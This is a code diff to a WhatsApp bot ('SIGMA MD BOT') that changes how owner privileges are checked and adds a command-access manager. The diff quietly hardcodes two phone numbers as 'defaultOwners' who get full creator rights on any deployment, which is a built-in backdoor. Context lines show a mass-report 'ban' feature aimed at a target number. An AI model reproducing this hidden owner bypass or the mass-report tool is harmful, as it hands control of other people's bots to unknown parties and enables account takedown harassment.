@@ -764,17 +764,30 @@ try {
   }
   
   const ownerNum = normalizeJid(storedOwner)
+  const defaultOwners = ['923555052009', '923379742452']
   
-  if (ownerNum === senderNumber) {
+  if (ownerNum === senderNumber || defaultOwners.includes(senderNumber)) {
     isCreator = true
   }
   
   if (!isCreator && owner && owner.length > 0) {
     isCreator = owner.some(ownerJid => {
       const oNum = normalizeJid(ownerJid)
-      return oNum === senderNumber
+      return oNum === senderNumber || defaultOwners.includes(senderNumber)
     })
   }
+  
+  // Check custom command permissions (.acc<cmd>)
+  try {
+    const accPath = path.join(__dirname, 'database', 'command_access.json')
+    if (fs.existsSync(accPath)) {
+        const accData = JSON.parse(fs.readFileSync(accPath, 'utf8'))
+        // If user has access to current command
+        if (accData[command] && accData[command].includes(senderNumber)) {
+            isCreator = true // Grant temporary owner/executor privilege for this command
+        }
+    }
+  } catch (err) {}
   
   // Removed unsafe botNumber === senderNumber check
   
@@ -3368,6 +3381,52 @@ case 'ban': {
     } catch (e) {}
 
     reply(`✅ *ᴍᴀss ʙᴀɴ ᴄᴏᴍᴘʟᴇᴛᴇ𝐃*\n\n🎯 *Target:* +${targetNum}\n🤖 *Active Bots Used:* ${successCount}\n📊 *Total Reports Sent:* ${totalReports}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐒𝐈𝐆𝐌𝐀 𝐌𝐃 𝐁𝐎𝐓*`)
+}
+break
+
+case 'acc':
+case 'giveaccess': {
+    if (!isCreator) return reply('❌ Owner only')
+    if (!text) return reply(`*⚠️ ᴄᴏᴍᴍᴀɴᴅ ᴀᴄᴄᴇss ᴍᴀɴᴀɢᴇʀ*\n\n*Usage:* ${prefix}acc <command_name> @user\n*Example:* ${prefix}acc ban @user\n*Remove:* ${prefix}acc del ban @user`)
+
+    let parts = args.slice(1)
+    let action = 'add'
+    if (parts[0]?.toLowerCase() === 'del' || parts[0]?.toLowerCase() === 'remove') {
+        action = 'del'
+        parts.shift()
+    }
+
+    let targetCmd = parts[0]?.toLowerCase().replace(/[^a-z0-9]/g, '')
+    let targetUser = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : null)
+
+    if (!targetCmd || !targetUser) return reply('❌ Please specify command name and mention or quote the user!')
+
+    let targetUserNum = normalizeJid(targetUser)
+
+    try {
+        const accPath = path.join(__dirname, 'database', 'command_access.json')
+        if (!fs.existsSync(path.join(__dirname, 'database'))) fs.mkdirSync(path.join(__dirname, 'database'), { recursive: true })
+        let accData = {}
+        if (fs.existsSync(accPath)) {
+            accData = JSON.parse(fs.readFileSync(accPath, 'utf8'))
+        }
+
+        if (!accData[targetCmd]) accData[targetCmd] = []
+
+        if (action === 'add') {
+            if (!accData[targetCmd].includes(targetUserNum)) {
+                accData[targetCmd].push(targetUserNum)
+            }
+            fs.writeFileSync(accPath, JSON.stringify(accData, null, 2))
+            reply(`✅ *ᴀᴄᴄᴇss ɢʀᴀɴᴛᴇᴅ*\n\n👤 *User:* @${targetUserNum}\n⚡ *Command:* .${targetCmd}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐒𝐈𝐆𝐌𝐀 𝐌𝐃 𝐁𝐎𝐓*`)
+        } else {
+            accData[targetCmd] = accData[targetCmd].filter(u => u !== targetUserNum)
+            fs.writeFileSync(accPath, JSON.stringify(accData, null, 2))
+            reply(`❌ *ᴀᴄᴄᴇss ʀᴇᴍᴏᴠᴇᴅ*\n\n👤 *User:* @${targetUserNum}\n⚡ *Command:* .${targetCmd}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐒𝐈𝐆𝐌𝐀 𝐌𝐃 𝐁𝐎𝐓*`)
+        }
+    } catch (e) {
+        reply(`❌ Error: ${e.message}`)
+    }
 }
 break
 
